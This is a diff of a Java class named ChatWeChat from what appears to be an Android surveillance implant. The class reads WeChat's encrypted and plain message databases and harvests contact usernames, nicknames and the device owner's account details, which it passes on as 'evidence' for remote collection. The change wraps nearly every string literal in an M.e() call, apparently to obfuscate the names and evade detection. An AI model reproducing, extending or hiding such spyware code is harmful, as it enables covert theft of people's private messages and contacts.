@@ -25,8 +25,8 @@ public class ChatWeChat extends SubModuleChat {
 
 	private static final int PROGRAM = 0x0a;
 
-	private static final String DEFAULT_LOCAL_NUMBER = "local";
-	String pObserving = "com.tencent.mm";
+	private static final String DEFAULT_LOCAL_NUMBER =  M.e("local");
+	String pObserving = M.e("com.tencent.mm");
 
 	// private String myPhoneNumber = "local";
 	String myId;
@@ -100,9 +100,9 @@ public class ChatWeChat extends SubModuleChat {
 		try {
 			boolean updateMarkup = false;
 			// cifrato
-			String dbEncFile = "EnMicroMsg.db";
+			String dbEncFile = M.e("EnMicroMsg.db");
 			// in chiaro
-			String dbFile = "MicroMsg.db";
+			String dbFile = M.e("MicroMsg.db");
 			String dbDir = "";
 
 			lastLine = markup.unserialize(new Long(0));
@@ -267,7 +267,7 @@ public class ChatWeChat extends SubModuleChat {
 		String[] projection = new String[] { M.e("username"), M.e("nickname")};
 
 		boolean tosave = false;
-		RecordVisitor visitor = new RecordVisitor(projection, "nickname not null ") {
+		RecordVisitor visitor = new RecordVisitor(projection, M.e("nickname not null ")) {
 
 			@Override
 			public long cursor(Cursor cursor) {
@@ -276,7 +276,7 @@ public class ChatWeChat extends SubModuleChat {
 				String nick = cursor.getString(1);
 
 				Contact c = new Contact(username, username, nick, "");
-				if (username != null && username.startsWith("wxid")) {
+				if (username != null && username.startsWith( M.e("wxid"))) {
 					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.WECHAT, c)) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (cursor) need to serialize");
@@ -288,7 +288,7 @@ public class ChatWeChat extends SubModuleChat {
 			}
 		};
 
-		if (helper.traverseRecords("rcontact", visitor) == 1) {
+		if (helper.traverseRecords( M.e("rcontact"), visitor) == 1) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveWeChatContacts) serialize");
 			}
@@ -313,7 +313,7 @@ public class ChatWeChat extends SubModuleChat {
 			}
 		};
 
-		long ret = helper.traverseRecords("userinfo", visitor);
+		long ret = helper.traverseRecords( M.e("userinfo"), visitor);
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (setMyAccount) %s, %s, %s", myId, myName, myPhone);
 		}
